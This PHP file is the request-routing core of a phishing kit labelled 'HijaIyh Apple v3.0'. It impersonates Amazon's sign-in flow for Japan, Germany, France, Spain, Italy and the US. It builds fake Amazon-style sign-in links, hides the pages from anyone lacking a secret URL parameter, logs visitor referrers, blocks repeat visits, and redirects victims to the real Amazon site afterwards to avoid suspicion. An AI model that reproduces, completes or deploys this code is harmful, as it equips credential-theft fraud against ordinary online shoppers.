<?php 
# HijaIyh Project.
/**
* HijaIyh Apple v3.0
* @version 3.0
* @author shutdown57 < indonesianpeople.shutdown57@gmail.com >
* @copyright (c) HijaIyh Production 2019.
**/

## COUNTRY KHUSUS ##
if($core->parse_hijaiyh('sp','special') == 'jp')
{
    $config['amz_logo'] = 'amazon1-jp.png';
    $config['step_logo'] = '1-jp.png';
    $config['step2_logo'] = '2-jp.png';
    $config['step3_logo'] = '3-jp.png';
    $config['redirect'] = 'https://www.amazon.co.jp/gp/css/homepage.html/ref=nav_youraccount_ya';
    $config['domain'] = 'Amazon.co.jp';
}elseif($core->parse_hijaiyh('sp','special') == 'de')
{
    $config['amz_logo'] = 'amazon1-de.png';
    $config['step_logo'] = '1-x.png';
    $config['step2_logo'] = '2-x.png';
    $config['step3_logo'] = '3-x.png';
    $config['redirect'] = 'https://href.li/?http://www.amazon.de/gp/help/customer/display.html?ie=UTF';
    $config['domain'] = 'Amazon.de';
}elseif($core->parse_hijaiyh('sp','special') == 'fr')
{
    $config['amz_logo'] = 'amazon1-fr.png';
    $config['step_logo'] = '1-x.png';
    $config['step2_logo'] = '2-x.png';
    $config['step3_logo'] = '3-x.png';
    $config['redirect'] = 'https://href.li/?http://www.amazon.fr/gp/help/customer/display.html?ie=UTF';
    $config['domain'] = 'Amazon.fr';
}elseif($core->parse_hijaiyh('sp','special') == 'es'){
    $config['amz_logo'] = 'amazon1-es.png';
    $config['step_logo'] = '1-x.png';
    $config['step2_logo'] = '2-x.png';
    $config['step3_logo'] = '3-x.png';
    $config['redirect'] = 'https://href.li/?http://www.amazon.es/gp/help/customer/display.html?ie=UTF';
    $config['domain'] = 'Amazon.es';
}elseif($core->parse_hijaiyh('sp','special') == 'it')
{
    $config['amz_logo'] = 'amazon1-it.png';
    $config['step_logo'] = '1-x.png';
    $config['step2_logo'] = '2-x.png';
    $config['step3_logo'] = '3-x.png';
    $config['redirect'] = 'https://href.li/?http://www.amazon.it/gp/help/customer/display.html?ie=UTF';
    $config['domain'] = 'Amazon.it';

}else{
    $config['amz_logo'] = 'amazon1.png';
    $config['step_logo'] = '1.png';
    $config['step2_logo'] = '2.png';
    $config['step3_logo'] = '3.png';
    $config['redirect'] = 'https://href.li/?http://www.amazon.com/gp/help/customer/display.html?ie=UTF';
    $config['domain'] = 'Amazon.com';
}

if($core->is_mobile())
{
	$link = 'ap/m.signin?openid.pape.max_auth_age='.sha1($_SERVER['HTTP_USER_AGENT']).'&locale='.$locale;
}
else{

	$link = 'ap/signin?openid.pape.max_auth_age='.sha1($_SERVER['HTTP_USER_AGENT']).'&locale='.$locale;
}


if(empty($core->session('logged_in'))){

if(isset($_GET[$core->parse_hijaiyh('sp','param')]))
{
    $core->create_session(['logged_in' => $_SERVER['REMOTE_ADDR']]);
    $core->stats('visitor','Visitor source : '.$_SERVER['HTTP_REFERER']);

    $core->redirect($link);
    //header('location:?page=signin&appIdKey='.sha1($_SERVER['HTTP_USER_AGENT']).'&locale='.$locale);exit;
}else{
    
    $core->anti_loop();
    $core->suspend();exit;
}

}else{

if($core->parse_hijaiyh('sp','one_time') == 1){
if(isset($_SESSION['done']))
{
    $core->stats('bot','Access blocked by One Time Access');
    $blocker->one_time($core->userIP());
    $core->redirect('https://amazon.com');
}
}

$page = @$_GET['page'];
$req = @$_GET['req'];
if(empty($page))
{
    if(!empty($req)){
        if(file_exists(HADIR.$iyh['app_path'].'/request/iyh_'.$req.'.php'))
        {
            require_once(HADIR.$iyh['app_path'].'/request/iyh_'.$req.'.php');
        }else{
            exit('error request');
        }
    }else{
        $core->redirect($link);
    }

}else{

    if(isset($page))
    {
        if(file_exists(HADIR.$iyh['app_path'].'/action/iyh_'.strtolower($page).'.php'))
        {
            require_once(HADIR.$iyh['app_path'].'/action/iyh_'.strtolower($page).'.php');
        }else{
            exit('error');
        }
    }
}

}

?>